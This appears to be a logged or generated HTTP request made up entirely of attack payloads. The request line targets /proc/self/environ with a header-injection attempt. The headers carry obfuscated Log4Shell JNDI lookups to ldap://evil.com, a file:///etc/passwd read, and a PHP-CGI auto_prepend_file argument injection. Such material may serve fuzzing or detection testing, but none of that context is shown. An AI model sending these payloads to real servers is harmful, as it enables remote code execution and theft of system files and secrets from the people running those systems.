PUT /proc/self/environ嘊嘍Set-Cookie: evil=true?
Headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept-Encoding': '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Authorization': '${${lower:j}ndi:ldap://evil.com/a}', 'Content-Length': 'file:///etc/passwd', 'Referer': '-d auto_prepend_file=php://input'}
